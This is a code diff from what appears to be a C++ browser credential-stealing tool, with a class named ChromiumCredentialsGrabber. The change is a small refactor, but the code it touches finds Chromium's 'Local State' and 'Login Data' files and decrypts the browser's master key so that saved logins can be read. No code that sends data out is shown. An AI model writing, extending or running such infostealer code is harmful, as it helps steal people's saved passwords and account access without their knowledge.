@@ -29,7 +29,7 @@ std::optional<Credentials> ChromiumCredentialsGrabber::grab_credentials() const
 		return {};
 	}
 
-	const LocalState local_state = LocalState::from_app_root(m_app_root);
+	const LocalState local_state = LocalState::from_path(get_local_state_path(m_app_root));
 	const auto aes_key = local_state.get_master_key();
 
 	Credentials credentials;
@@ -104,18 +104,18 @@ std::optional<Time::Datetime> ChromiumCredentialsGrabber::convert_datetime(const
 	return Time::from_webkit_time(webkit_datetime);
 }
 
-std::filesystem::path ChromiumCredentialsGrabber::get_user_data_path(const std::filesystem::path& app_root)
+std::filesystem::path ChromiumCredentialsGrabber::get_user_data_path(const std::filesystem::path& app_root) const
 {
 	return app_root / "User Data";
 }
 
-std::filesystem::path ChromiumCredentialsGrabber::get_local_state_path(const std::filesystem::path& app_root)
+std::filesystem::path ChromiumCredentialsGrabber::get_local_state_path(const std::filesystem::path& app_root) const
 {
 	return get_user_data_path(app_root) / L"Local State";
 }
 
 std::filesystem::path ChromiumCredentialsGrabber::get_login_data_path(const std::filesystem::path& app_root,
-                                                                      const std::wstring& profile)
+                                                                      const std::wstring& profile) const
 {
 	return get_user_data_path(app_root) / profile / L"Login Data";
 }
@@ -142,8 +142,8 @@ Buffer ChromiumCredentialsGrabber::LocalState::get_master_key() const
 	return Crypto::unprotect_data(protected_key);
 }
 
-ChromiumCredentialsGrabber::LocalState ChromiumCredentialsGrabber::LocalState::from_app_root(
-	const std::filesystem::path& app_root)
+ChromiumCredentialsGrabber::LocalState ChromiumCredentialsGrabber::LocalState::from_path(
+	const std::filesystem::path& local_state_path)
 {
-	return LocalState(Json::parse(TemporaryFile(get_local_state_path(app_root)).read()));
+	return LocalState(Json::parse(TemporaryFile(local_state_path).read()));
 }
